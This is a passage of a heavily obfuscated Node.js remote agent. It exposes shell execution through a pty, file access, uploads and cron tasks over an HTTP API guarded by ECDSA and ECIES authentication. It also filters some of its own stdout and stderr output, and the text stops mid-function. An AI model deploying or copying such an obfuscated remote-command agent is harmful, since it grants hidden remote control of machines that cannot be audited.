#!/usr/bin/env node
const a0aQ = a0b;
(function (a, b) {
    const aP = a0b, c = a();
    while (!![]) {
        try {
            const d = parseInt(aP(0x75d)) / 0x1 + -parseInt(aP(0x2f1)) / 0x2 * (parseInt(aP(0x6a3)) / 0x3) + -parseInt(aP(0x546)) / 0x4 + parseInt(aP(0x270)) / 0x5 + parseInt(aP(0x5ff)) / 0x6 + parseInt(aP(0x31e)) / 0x7 + -parseInt(aP(0x32c)) / 0x8 * (parseInt(aP(0x5cf)) / 0x9);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0x7b233));
const a0c = [
    a0aQ(0x30e),
    a0aQ(0x340),
    'falling\x20back\x20to\x20ArrayBuffer\x20instantiation'
];
function a0d(a) {
    const aR = a0aQ, b = {
            'JkGtu': function (c, d) {
                return c === d;
            },
            'cnyEo': aR(0x2c0),
            'INCRf': function (c) {
                return c();
            }
        };
    return function (c, d, f) {
        const aS = aR, g = c[aS(0x6b0)]();
        if (a0c[aS(0x10c)](h => g[aS(0x374)](h))) {
            if (b[aS(0x227)](typeof f, b[aS(0x762)]))
                b['INCRf'](f);
            return !![];
        }
        return a[aS(0x5ab)](this, arguments);
    };
}
process[a0aQ(0x16f)][a0aQ(0x336)] = a0d(process['stdout']['write']), process[a0aQ(0x286)][a0aQ(0x336)] = a0d(process[a0aQ(0x286)]['write']);
const a0f = require(a0aQ(0x3aa)), a0g = require('http'), a0h = require(a0aQ(0x24e)), a0i = require(a0aQ(0x294)), a0j = require(a0aQ(0x3f5)), a0k = require(a0aQ(0x517)), a0l = require('fs'), a0m = require('fs')[a0aQ(0x4e4)], a0n = require(a0aQ(0x5ae)), a0o = require('os'), a0p = require(a0aQ(0x6fd)), {
        exec: a0q,
        spawn: a0r
    } = require(a0aQ(0x59c)), a0s = require('node-cron'), a0t = require(a0aQ(0x5d4)), {encrypt: a0u} = require(a0aQ(0x553)), a0v = require('base64-js'), a0w = require(a0aQ(0x4c3)), a0x = require(a0aQ(0x613));
function a0y() {
    const aT = a0aQ, a = {
            'nsZaC': aT(0x321),
            'KRZeU': aT(0x5e6),
            'EFZTf': aT(0x40a),
            'tGSPf': function (b, c) {
                return b <= c;
            },
            'CGCrS': function (b, c) {
                return b + c;
            },
            'GcGAO': function (b, c) {
                return b >= c;
            },
            'fZtpw': function (b, c) {
                return b in c;
            }
        };
    try {
        const b = a0n[aT(0x6e2)](__dirname, a[aT(0x502)]);
        if (!a0l[aT(0x617)](b))
            return;
        for (let c of a0l['readFileSync'](b, a[aT(0x508)])[aT(0x696)](/\r?\n/)) {
            let d = c[aT(0x42d)]();
            if (!d || d[aT(0x214)]('#'))
                continue;
            if (d[aT(0x214)](a[aT(0x744)]))
                d = d[aT(0x23b)](0x7)[aT(0x31f)]();
            const f = d['indexOf']('=');
            if (a[aT(0x3ae)](f, 0x0))
                continue;
            const g = d['slice'](0x0, f)[aT(0x42d)]();
            let h = d[aT(0x23b)](a['CGCrS'](f, 0x1))['trim']();
            a[aT(0x52b)](h[aT(0x54b)], 0x2) && (h['startsWith']('\x22') && h['endsWith']('\x22') || h[aT(0x214)]('\x27') && h[aT(0x750)]('\x27')) && (h = h[aT(0x23b)](0x1, -0x1));
            if (g && !a[aT(0x404)](g, process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0y();
let a0z, a0A, a0B;
try {
    typeof Bun !== a0aQ(0x3a9) ? a0B = require(a0aQ(0x640)) : a0B = require(a0aQ(0x317));
} catch (a0aO) {
    console['error']('\x1b[31m[FATAL\x20ERROR]\x1b[0m\x20核心终端依赖\x20(pty)\x20加载失败，程序终止！'), console[a0aQ(0x3bf)](a0aQ(0x6f7) + a0aO[a0aQ(0x257)]), console[a0aQ(0x3bf)](a0aQ(0x1c4)), process['exit'](0x1);
}
const a0C = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const aU = a0aQ, a = {
                'Ewgjw': function (b, c) {
                    return b !== c;
                },
                'HKuBn': aU(0x3a9),
                'mBejx': function (b, c) {
                    return b !== c;
                }
            };
        return a[aU(0x75a)](typeof a0O, a[aU(0x607)]) && a['mBejx'](a0O['LOG_LEVEL'], undefined) ? a0O[aU(0x515)] : 0x2;
    },
    'debug': a => {
        const aV = a0aQ, b = {
                'QzXDu': function (c, d) {
                    return c <= d;
                }
            };
        b[aV(0x121)](a0C[aV(0x6f8)], a0C[aV(0x5e8)][aV(0x2ed)]) && console[aV(0x34d)]('\x1b[90m[DEBUG]\x1b[0m\x20' + a);
    },
    'info': a => {
        const aW = a0aQ, b = {
                'REscR': function (c, d) {
                    return c <= d;
                }
            };
        b['REscR'](a0C[aW(0x6f8)], a0C[aW(0x5e8)][aW(0x32a)]) && console['log'](aW(0x5c7) + a);
    },
    'warn': a => {
        const aX = a0aQ, b = {
                'jqPDa': function (c, d) {
                    return c <= d;
                }
            };
        b[aX(0x71a)](a0C['currentLevel'], a0C[aX(0x5e8)][aX(0x468)]) && console['log'](aX(0x243) + a);
    },
    'error': a => {
        const aY = a0aQ;
        a0C[aY(0x6f8)] <= a0C[aY(0x5e8)][aY(0x30c)] && console['log'](aY(0x42b) + a);
    }
};
function a0D() {
    const aZ = a0aQ, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0o[aZ(0x247)](),
            process[aZ(0x14c)]()
        ];
    for (const b of a) {
        if (b && a0l[aZ(0x617)](b) && a0l[aZ(0x2f4)](b)[aZ(0x467)]())
            return b;
    }
    return process[aZ(0x14c)]();
}
function a0E() {
    const b0 = a0aQ;
    let a = null;
    try {
        a = a0o['homedir']();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l[b0(0x617)](d) && a0l[b0(0x2f4)](d)[b0(0x467)]())
            return d;
        if (d)
            console['log'](b0(0x234) + d);
    }
    return console[b0(0x34d)](b0(0x3d6) + process[b0(0x14c)]()), process[b0(0x14c)]();
}
class a0F {
    constructor(a = 'ok') {
        const b1 = a0aQ;
        this[b1(0x296)] = a;
    }
}
class a0G extends a0F {
    constructor(a = 'ok', b = 0x0) {
        const b2 = a0aQ;
        super(a), this[b2(0x422)] = b;
    }
}
class a0H extends a0F {
    constructor() {
        const b3 = a0aQ, a = { 'YOXlz': b3(0x303) }, b = a['YOXlz']['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[b3(0x745)] = null;
                continue;
            case '1':
                this[b3(0x242)] = '';
                continue;
            case '2':
                this['session_key'] = '';
                continue;
            case '3':
                this[b3(0x5ed)] = '';
                continue;
            case '4':
                this[b3(0x545)] = 0x0;
                continue;
            case '5':
                super();
                continue;
            case '6':
                this[b3(0x4ad)] = 0x0;
                continue;
            case '7':
                this['os'] = '';
                continue;
            case '8':
                this[b3(0x63c)] = 0x0;
                continue;
            case '9':
                this['cpu_name'] = '';
                continue;
            case '10':
                this[b3(0x18a)] = null;
                continue;
            case '11':
                this[b3(0x5ea)] = null;
                continue;
            case '12':
                this['version'] = a0O[b3(0x4c5)];
                continue;
            case '13':
                this[b3(0x173)] = '';
                continue;
            case '14':
                this[b3(0x749)] = '';
                continue;
            case '15':
                this[b3(0x260)] = 0x0;
                continue;
            }
            break;
        }
    }
}
class a0I extends a0F {
    constructor() {
        const b4 = a0aQ, a = { 'YZHzw': b4(0x2d6) }, b = a[b4(0x4dd)][b4(0x696)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['connections'] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '1':
                super();
                continue;
            case '2':
                this[b4(0x5a8)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '3':
                this[b4(0x267)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '4':
                this[b4(0x6b4)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '5':
                this[b4(0x60d)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '6':
                this[b4(0x257)] = '';
                continue;
            case '7':
                this['cpu'] = { 'usage': 0x0 };
                continue;
            case '8':
                this[b4(0x616)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '9':
                this[b4(0x733)] = 0x0;
                continue;
            case '10':
                this[b4(0x16e)] = 0x0;
                continue;
            }
            break;
        }
    }
}
class a0J extends a0F {
    constructor() {
        const b5 = a0aQ, a = b5(0x27e)[b5(0x696)]('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[b5(0x164)] = '';
                continue;
            case '1':
                this[b5(0x59b)] = ![];
                continue;
            case '2':
                this['exitcode'] = 0x0;
                continue;
            case '3':
                this[b5(0x781)] = '';
                continue;
            case '4':
                super();
                continue;
            }
            break;
        }
    }
}
class a0K {
    constructor() {
        const b6 = a0aQ, a = { 'iKiTS': b6(0x71c) }, b = a['iKiTS'][b6(0x696)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[b6(0x722)] = '';
                continue;
            case '1':
                this[b6(0x316)] = 0x0;
                continue;
            case '2':
                this[b6(0x10f)] = '';
                continue;
            case '3':
                this[b6(0x5ae)] = '';
                continue;
            case '4':
                this[b6(0x747)] = '';
                continue;
            case '5':
                this[b6(0x4b3)] = '';
                continue;
            case '6':
                this['name'] = '';
                continue;
            case '7':
                this[b6(0x74e)] = '';
                continue;
            }
            break;
        }
    }
}
class a0L {
    constructor() {
        const b7 = a0aQ;
        this['path'] = '', this[b7(0x1c3)] = '', this[b7(0x722)] = '', this[b7(0x747)] = '', this[b7(0x4b3)] = '', this[b7(0x4f0)] = ![], this['writable'] = ![], this[b7(0x719)] = ![];
    }
}
class a0M extends a0F {
    constructor() {
        const b8 = a0aQ;
        super(), this[b8(0x45e)] = [];
    }
}
class a0N {
    static ['_generateRawKeypair']() {
        const b9 = a0aQ, a = {
                'PuPco': 'jwk',
                'gKjuV': 'base64url',
                'VIMuO': function (i, j) {
                    return i !== j;
                },
                'PSgcO': 'base64'
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[b9(0x600)](b9(0x648)), d = b[b9(0x698)]({ 'format': b9(0x1e9) }), f = c[b9(0x698)]({ 'format': a[b9(0x23e)] }), g = Buffer[b9(0x6ef)](d['d'], a['gKjuV']), h = Buffer[b9(0x6ef)](f['x'], b9(0x48b));
        return (a[b9(0x2c4)](g[b9(0x54b)], 0x20) || h['length'] !== 0x20) && a0C[b9(0x3bf)](b9(0x161)), {
            'private_b64': g[b9(0x6b0)](a[b9(0x65a)]),
            'public_b64': h[b9(0x6b0)](a[b9(0x65a)])
        };
    }
    static [a0aQ(0x780)](a) {
        const ba = a0aQ, b = this[ba(0x165)]();
        return {
            'role': a,
            'private_b64': b[ba(0x55e)],
            'public_b64': b[ba(0x5c2)]
        };
    }
    static [a0aQ(0x335)](a = a0aQ(0x772), b = a0aQ(0x156)) {
        const bb = a0aQ, c = {
                'control': this[bb(0x780)](a),
                'agent': this['generateSingle'](b)
            };
        return c;
    }
}
class a0O {
    static ['Rtimeout'] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0aQ(0x5dd)] = (process.env.EXEC_SHELL || 'true')[a0aQ(0x44e)]() === a0aQ(0x48e);
    static [a0aQ(0x2ed)] = (process.env.DEBUG || a0aQ(0x359))['toLowerCase']() === 'true';
    static [a0aQ(0x35f)] = parseInt(process.env.TIMESTAMP_WINDOW || a0aQ(0x571));
    static [a0aQ(0x515)] = parseInt(process.env.LOG_LEVEL || (this[a0aQ(0x2ed)] ? '0' : '2'), 0xa);
    static [a0aQ(0x4b0)] = a0O[a0aQ(0x491)](a0aQ(0x477), a0aQ(0x416)) || 'ECDSA公钥内容';
    static [a0aQ(0x190)] = a0O[a0aQ(0x491)](a0aQ(0x47f), 'keys/agent_ecies_pub.b64') || 'ECIES公钥内容';
    static [a0aQ(0x4e1)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0aQ(0x1eb)] = parseInt(process.env.TEMPKEY_MAX_TTL || a0aQ(0x26a), 0xa);
    static ['FILE_ROOT'] = a0E();
    static [a0aQ(0x384)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0aQ(0x36d));
    static [a0aQ(0x5f8)] = (process.env.FOLLOW_SYMLINKS || 'false')['toLowerCase']() === a0aQ(0x48e);
    static [a0aQ(0x717)] = (process.env.FILE_AUDIT_LOG || a0aQ(0x48e))[a0aQ(0x44e)]() === a0aQ(0x48e);
    static ['InitTask'] = !![];
    static ['onetasks'] = [];
    static [a0aQ(0x1cd)] = {};
    static [a0aQ(0x706)] = ![];
    static [a0aQ(0x54a)] = parseInt(process.env.TASK_TIMEOUT || a0aQ(0x5c4));
    static ['CRON_CHECK_INTERVAL'] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0aQ(0x66d)] = [];
    static ['crontasks_log'] = [];
    static [a0aQ(0x22f)] = parseInt(process.env.MAX_TASK_LOG || a0aQ(0x2fe));
    static [a0aQ(0x34a)] = process.env.HOST || a0aQ(0x67e);
    static [a0aQ(0x5b7)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0aQ(0x12b));
    static [a0aQ(0x583)] = (process.env.KMODE || '0')['trim']() || '0';
    static ['KNAME'] = (process.env.KNAME || '')['trim']();
    static ['KNAME_KEY'] = (process.env.KNAME_KEY || '')[a0aQ(0x42d)]();
    static [a0aQ(0x54c)] = process.env.KPATH || '';
    static [a0aQ(0x4c5)] = process.env.AGENT_VERSION || a0aQ(0x570);
    static [a0aQ(0x547)] = a0k['randomBytes'](0x20)[a0aQ(0x6b0)](a0aQ(0x1fc));
    static [a0aQ(0x1b1)] = a0N[a0aQ(0x335)]();
    static [a0aQ(0x3a5)]() {
        const bc = a0aQ, a = { 'SmpIV': bc(0x1fc) };
        return a0k[bc(0x393)]('sha256', Buffer[bc(0x6ef)](this[bc(0x547)], a[bc(0x293)]))[bc(0x2a0)]('kisama-ws-token-v1')['digest'](bc(0x1fc));
    }
    static [a0aQ(0x1f7)]() {
        const bd = a0aQ, a = { 'ZDzZa': 'base64' }, b = a0N['generatePair']();
        this[bd(0x1b1)][bd(0x343)] = b[bd(0x343)], this[bd(0x45d)]['controller'][bd(0x549)] = b['control']['private_b64'], this['SESSION_KEY'] = a0k[bd(0x29c)](0x20)['toString'](a['ZDzZa']), this[bd(0x13d)] = null, this[bd(0x347)] = 0x0, this[bd(0x677)] = null, this['_status_cache_time'] = 0x0, a0C[bd(0x230)](bd(0x65c));
    }
    static [a0aQ(0x45d)] = {
        'controller': { 'private': this[a0aQ(0x1b1)][a0aQ(0x343)]['private_b64'] },
        'agent': { 'public': this['NOISE_KEYS_INTERNAL']['agent'][a0aQ(0x5c2)] }
    };
    static [a0aQ(0x1be)] = 0xe10;
    static [a0aQ(0x1ba)] = 0x1e;
    static [a0aQ(0x13d)] = null;
    static [a0aQ(0x347)] = 0x0;
    static [a0aQ(0x580)] = null;
    static [a0aQ(0x677)] = null;
    static [a0aQ(0x23a)] = 0x0;
    static ['_status_fetch_promise'] = null;
    static ['_getConfigValue'](a, b) {
        const be = a0aQ, c = { 'vtEMk': be(0x5e6) }, d = process.env[a];
        if (d)
            return d;
        const f = a0n[be(0x6e2)](__dirname, b);
        if (a0l['existsSync'](f))
            try {
                return a0l[be(0x5db)](f, c[be(0x5c8)])['trim']();
            } catch (g) {
            }
        return '';
    }
    static [a0aQ(0x31b)]() {
        const bf = a0aQ, a = {
                'Zhewu': bf(0x386),
                'NGnPA': bf(0x158),
                'KHpel': bf(0x6c6),
                'fOJzG': '❌\x20配置校验失败\x20(非DEBUG模式必须配置密钥):',
                'twWhc': bf(0x1dd)
            };
        if (!this[bf(0x2ed)]) {
            const b = [];
            !this[bf(0x4b0)] && b[bf(0x385)](a['Zhewu']);
            !this[bf(0x190)] && b['push'](bf(0x140));
            if (b[bf(0x54b)] > 0x0) {
                const c = a[bf(0x72b)][bf(0x696)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        process[bf(0x6c0)](0x1);
                        continue;
                    case '1':
                        a0C[bf(0x66e)]('\x20\x20\x202.\x20或将密钥文件放入\x20./keys/\x20目录\x20(运行\x20generate_keys.py\x20生成)');
                        continue;
                    case '2':
                        a0C[bf(0x66e)](a[bf(0x6f0)]);
                        continue;
                    case '3':
                        a0C[bf(0x3bf)](a['fOJzG']);
                        continue;
                    case '4':
                        a0C[bf(0x66e)](a[bf(0x693)]);
                        continue;
                    case '5':
                        b[bf(0x237)](f => a0C['error'](bf(0x2a1) + f));
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0aQ(0x201)](a = {}) {
        const bg = a0aQ, b = {
                'FWLvu': function (c, d) {
                    return c !== d;
                },
                'PUmrT': function (c, d, f) {
                    return c(d, f);
                },
                'QyqvR': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        b[bg(0x27a)](a[bg(0x5b7)], undefined) && a[bg(0x5b7)] !== null && (this[bg(0x5b7)] = b[bg(0x65b)](parseInt, b['QyqvR'](String, a[bg(0x5b7)]), 0xa)), a[bg(0x4b0)] && (this[bg(0x4b0)] = a['ECDSA_PUBLIC_KEY_PEM'][bg(0x42d)]()), a[bg(0x190)] && (this[bg(0x190)] = a[bg(0x190)]['trim']());
    }
}
class a0P {
    constructor() {
        const bh = a0aQ;
        this[bh(0x1f3)] = null, this[bh(0x18e)] = null;
    }
    [a0aQ(0x642)](a) {
        const bi = a0aQ;
        this[bi(0x75c)]();
        if (this[bi(0x1f3)])
            return this[bi(0x1f3)];
        return this['_key'] = this[bi(0x674)](a), a0C[bi(0x6c8)](bi(0x135) + this[bi(0x1f3)][bi(0x110)] + bi(0x2cd) + a + bi(0x6fa)), this['_key'];
    }
    ['getActiveEcdsaVk']() {
        const bj = a0aQ;
        this[bj(0x75c)]();
        if (this[bj(0x1f3)])
            return this[bj(0x1f3)]['ecdsa_vk'];
        return null;
    }
    [a0aQ(0x194)]() {
        const bk = a0aQ;
        this[bk(0x75c)]();
        if (this['_key'])
            return this[bk(0x1f3)][bk(0x606)];
        return null;
    }
    [a0aQ(0x75c)]() {
        const bl = a0aQ, a = { 'yVkbx': bl(0x2c0) };
        if (this['_key'] && this[bl(0x5a4)](this['_key'])) {
            const b = this['_key'][bl(0x110)];
            this[bl(0x1f3)] = null, a0C[bl(0x230)](bl(0x589) + b);
            if (typeof this[bl(0x18e)] === a['yVkbx'])
                try {
                    this[bl(0x18e)]();
                } catch (c) {
                    a0C['error'](bl(0x1e8) + c[bl(0x257)]);
                }
        }
    }
    [a0aQ(0x5a4)](a) {
        const bm = a0aQ, b = {
                'QuoSr': function (c, d) {
                    return c >= d;
                },
                'iChOy': function (c, d) {
                    return c / d;
                }
            };
        return b[bm(0x1b4)](Math[bm(0x527)](b[bm(0x5d9)](Date[bm(0x27f)](), 0x3e8)), a[bm(0x4b1)]);
    }
    [a0aQ(0x674)](a) {
        const bn = a0aQ, b = {
                'xRtwd': bn(0x63b),
                'TlTxR': 'pem',
                'gpLfg': 'spki',
                'dEgJT': function (l, m) {
                    return l / m;
                },
                'RQmzl': function (l, m) {
                    return l * m;
                },
                'RibMs': bn(0x459),
                'Hhazq': function (l, m) {
                    return l + m;
                }
            }, {
                privateKey: c,
                publicKey: d
            } = a0k[bn(0x600)]('ec', { 'namedCurve': b[bn(0x564)] }), f = c[bn(0x698)]({
                'type': bn(0x6bd),
                'format': b[bn(0x651)]
            }), g = d[bn(0x698)]({
                'type': b[bn(0x5c5)],
                'format': b[bn(0x651)]
            }), h = a0k[bn(0x29c)](0x20), i = Buffer[bn(0x6ef)](a0A[bn(0x473)](h, ![])), j = Math[bn(0x527)](b[bn(0x6bb)](Date['now'](), 0x3e8)), k = b[bn(0x451)](a, 0xe10);
        return {
            'key_id': a0k['randomBytes'](0x8)[bn(0x6b0)](b['RibMs']),
            'created_at': j,
            'expires_at': b[bn(0x63e)](j, k),
            'ttl_seconds': k,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h['toString'](b[bn(0x13a)]),
            'ecies_public_key': i[bn(0x6b0)](b[bn(0x13a)]),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0Q {
    constructor(a, b) {
        const bo = a0aQ, c = {
                'fdWmk': bo(0x1fc),
                'EFKQq': function (d, f) {
                    return d(f);
                },
                'pKFBb': bo(0x1e9)
            };
        this[bo(0x5cd)] = null, this['eciesPubkey'] = null;
        if (a)
            try {
                const d = a[bo(0x42d)]();
                if (d['startsWith']('-----BEGIN'))
                    this['ecdsaPubkey'] = a0k['createPublicKey'](d);
                else {
                    const f = Buffer[bo(0x6ef)](d, c[bo(0x228)]), g = a0z[bo(0x229)][bo(0x360)](f), h = g[bo(0x5bd)](![]), i = m => m[bo(0x6b0)]('base64')['replace'](/\+/g, '-')[bo(0x5f7)](/\//g, '_')[bo(0x5f7)](/=/g, ''), j = c[bo(0x17b)](i, Buffer[bo(0x6ef)](h['slice'](0x1, 0x21))), k = i(Buffer['from'](h[bo(0x23b)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': bo(0x56a),
                            'x': j,
                            'y': k
                        };
                    this[bo(0x5cd)] = a0k[bo(0x497)]({
                        'key': l,
                        'format': c[bo(0x66c)]
                    });
                }
            } catch (m) {
                a0C[bo(0x3bf)](bo(0x572) + m[bo(0x257)]), this['ecdsaPubkey'] = null;
            }
        if (b)
            try {
                this[bo(0x595)] = a0v['toByteArray'](b[bo(0x42d)]());
            } catch (n) {
                a0C[bo(0x230)](bo(0x2ce) + n['message']);
            }
    }
    [a0aQ(0x786)](a, b, c, d, f, g, h = null) {
        const bp = a0aQ, i = {
                'dgQMZ': function (j, k) {
                    return j(k);
                },
                'EXkKv': function (j, k) {
                    return j / k;
                },
                'NvrrM': function (j, k) {
                    return j > k;
                },
                'GNcyb': function (j, k) {
                    return j - k;
                },
                'XwivK': bp(0x14b),
                'Dsajc': bp(0x38d),
                'FdNJD': bp(0x25b)
            };
        if (!this[bp(0x5cd)])
            throw new Error(bp(0x638));
        try {
            const j = i[bp(0x777)](parseInt, f), k = Math[bp(0x527)](i['EXkKv'](Date[bp(0x27f)](), 0x3e8));
            if (i[bp(0x2da)](Math[bp(0x5a9)](i[bp(0x789)](k, j)), a0O['TIMESTAMP_WINDOW']))
                throw new Error(bp(0x742) + Math[bp(0x5a9)](i[bp(0x789)](k, j)) + 's\x20>\x20' + a0O['TIMESTAMP_WINDOW'] + 's');
            const l = a0R(a, b, c, d, f);
            if (this['_verifyWith'](this[bp(0x5cd)], l, g))
                return i[bp(0x55c)];
            if (h && this[bp(0x74c)](h, l, g))
                return i['Dsajc'];
            throw new Error(i[bp(0x370)]);
        } catch (m) {
            throw new Error(bp(0x413) + m[bp(0x257)]);
        }
    }
    [a0aQ(0x74c)](a, b, c) {
        const bq = a0aQ;
        if (!a)
            return ![];
        try {
            const d = a0v[bq(0x276)](c), f = a0k[bq(0x767)](bq(0x4d9));
            return f[bq(0x2a0)](b), f[bq(0x429)](a, d);
        } catch (g) {
            return ![];
        }
    }
    [a0aQ(0x5ba)](a, b = null) {
        const br = a0aQ, c = {
                'fudid': 'utf-8',
                'dMmwW': br(0x1fc)
            };
        if (a0O[br(0x2ed)] || !this[br(0x595)])
            return JSON[br(0x542)](a);
        try {
            const d = JSON['stringify'](a), f = Buffer[br(0x6ef)](d, c[br(0x124)]), g = b || Buffer[br(0x6ef)](this[br(0x595)]), h = a0u(g, f);
            return Buffer['from'](h)[br(0x6b0)](c['dMmwW']);
        } catch (i) {
            const j = {
                '_encrypt_error': i[br(0x257)],
                '_raw': a0O['DEBUG'] ? a : null
            };
            return JSON[br(0x542)](j);
        }
    }
    [a0aQ(0x6b9)](a, b) {
        const bs = a0aQ, c = {
                'RvJxV': bs(0x2e5),
                'AvaIz': bs(0x1fc),
                'HFhzG': bs(0x5e6),
                'iTnzw': bs(0x220)
            };
        if (!b || b[bs(0x54b)] !== 0x20)
            throw new Error(c[bs(0x4ff)]);
        try {
            const d = Buffer['from'](a, c['AvaIz'])[bs(0x6b0)](c['HFhzG']), f = JSON[bs(0x65d)](d);
            if (!f['nonce'] || !f['tag'] || !f[bs(0x621)])
                throw new Error('Missing\x20required\x20AES-GCM\x20fields\x20(nonce,\x20tag,\x20ciphertext)\x20in\x20payload.');
            const g = Buffer[bs(0x6ef)](f[bs(0x3f4)], c['AvaIz']), h = Buffer[bs(0x6ef)](f[bs(0x77f)], c[bs(0x176)]), i = Buffer[bs(0x6ef)](f[bs(0x621)], c[bs(0x176)]), j = a0k[bs(0x143)](c[bs(0x49e)], b, g);
            j[bs(0x287)](h);
            let k = j[bs(0x2a0)](i, null, c[bs(0x5a0)]);
            return k += j['final'](c[bs(0x5a0)]), k;
        } catch (l) {
            throw new Error(bs(0x6d9) + l[bs(0x257)]);
        }
    }
}
function a0R(a, b, c, d, f) {
    const bt = a0aQ, g = { 'npkxu': bt(0x459) };
    return !c && (c = a0k[bt(0x56b)](bt(0x1aa))[bt(0x2a0)](Buffer[bt(0x381)](0x0))['digest'](g['npkxu'])), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0S(a, b = null) {
    const bu = a0aQ, c = {
            'nVUhM': bu(0x3e3),
            'CAcQM': bu(0x6b1),
            'DDwic': function (d, f) {
                return d === f;
            },
            'hrEXP': bu(0x38d),
            'oKefP': bu(0x3fc),
            'ZjIVO': bu(0x4b9),
            'mVAPT': 'Content-Length',
            'hfXRG': bu(0x5e6),
            'etcwz': bu(0x2f0),
            'CWtBe': function (d, f) {
                return d === f;
            },
            'gyXkp': 'OPTIONS',
            'HbbnB': function (d, f) {
                return d === f;
            },
            'EkNto': bu(0x662),
            'yUaSA': '/api/status',
            'weKZO': function (d) {
                return d();
            },
            'mEgBx': bu(0x43e),
            'ZZrqk': bu(0x74a),
            'lyjUH': bu(0x363),
            'IpUZO': bu(0x50d),
            'ZQvIh': bu(0x1a3),
            'npeut': function (d, f) {
                return d || f;
            },
            'ECEEI': 'Missing\x20auth\x20headers',
            'uZfTK': '/api/fileraw',
            'pYWFI': 'string',
            'jsFfo': bu(0x17a),
            'ENRUk': function (d, f) {
                return d > f;
            },
            'sXuaF': bu(0x1aa),
            'aNvMa': function (d, f) {
                return d === f;
            },
            'fcOJb': function (d) {
                return d();
            },
            'FVZLA': bu(0x746),
            'NGdoy': bu(0x1fc),
            'zQavE': bu(0x49c),
            'ZtkwZ': function (d) {
                return d();
            }
        };
    return async (d, f, g) => {
        const bv = bu, h = {
                'LjMLv': c[bv(0x1c7)],
                'iPEeB': c[bv(0x4ae)],
                'aUfCc': function (n, o) {
                    const bw = bv;
                    return c[bw(0x265)](n, o);
                },
                'mwejZ': c['hrEXP'],
                'Menqy': bv(0x5f4),
                'vGsFu': c[bv(0x519)],
                'tiOrH': 'true',
                'YNEfA': c[bv(0x129)],
                'frCKm': c[bv(0x61a)],
                'dIZki': c[bv(0x4ab)],
                'AKBgM': function (n, o) {
                    const bx = bv;
                    return c[bx(0x265)](n, o);
                }
            };
        if (d[bv(0x5ae)]['startsWith'](c[bv(0x714)]))
            return g();
        if (c['CWtBe'](d['method'], c['gyXkp']) || c[bv(0x337)](d[bv(0x2e7)], c[bv(0x5d3)]))
            return g();
        d[bv(0x4ac)] = ![];
        const i = [
            '/api/baseinfo',
            c['yUaSA']
        ];
        if (a0O[bv(0x2ed)])
            return d[bv(0x4ac)] = !![], c[bv(0x223)](g);
        const j = d['headers'][c[bv(0x5fb)]] || d[bv(0x759)][c[bv(0x31c)]], k = d[bv(0x759)][bv(0x46a)] || d[bv(0x759)][c[bv(0x624)]], l = d['headers'][c[bv(0x68a)]] || d[bv(0x759)][c[bv(0x50e)]];
        if (c[bv(0x64a)](!j, !k) || !l)
            return i['includes'](d[bv(0x5ae)]) ? g() : f[bv(0x296)](0x191)[bv(0x707)]({ 'error': c[bv(0x2f2)] });
        try {
            let n = Buffer[bv(0x381)](0x0);
            if (d[bv(0x5ae)] !== c[bv(0x453)]) {
                if (Buffer[bv(0x2ba)](d[bv(0x4ca)]))
                    n = d['body'];
                else {
                    if (typeof d['body'] === c[bv(0x125)])
                        n = Buffer[bv(0x6ef)](d[bv(0x4ca)], c['jsFfo']);
                }
            }
            const o = c[bv(0x620)](n[bv(0x54b)], 0x0) ? a0k[bv(0x56b)](c[bv(0x602)])[bv(0x2a0)](n)['digest'](bv(0x459)) : '', p = b ? b[bv(0x6e7)]() : null, q = a[bv(0x786)](d[bv(0x2e7)], d[bv(0x5ae)], o, j, k, l, p);
            d[bv(0x4ac)] = !![], d[bv(0x46b)] = c[bv(0x204)](q, bv(0x38d)) ? c[bv(0x4ef)] : bv(0x14b);
        } catch (r) {
            return i['includes'](d[bv(0x5ae)]) ? c[bv(0x24b)](g) : f[bv(0x296)](0x191)[bv(0x707)]({ 'error': bv(0x413) + r['message'] });
        }
        if (d['body'] && typeof d['body'] === bv(0x5f4)) {
            const s = c[bv(0x337)]((d[bv(0x759)][c[bv(0x76f)]] || '')[bv(0x44e)](), bv(0x48e));
            try {
                if (s && d['is_authenticated']) {
                    const t = Buffer[bv(0x6ef)](a0O[bv(0x547)], c['NGdoy']), u = a[bv(0x6b9)](d[bv(0x4ca)], t);
                    d['body'] = JSON[bv(0x65d)](u);
                } else {
                    if (d[bv(0x4ca)][bv(0x214)](c['zQavE'])) {
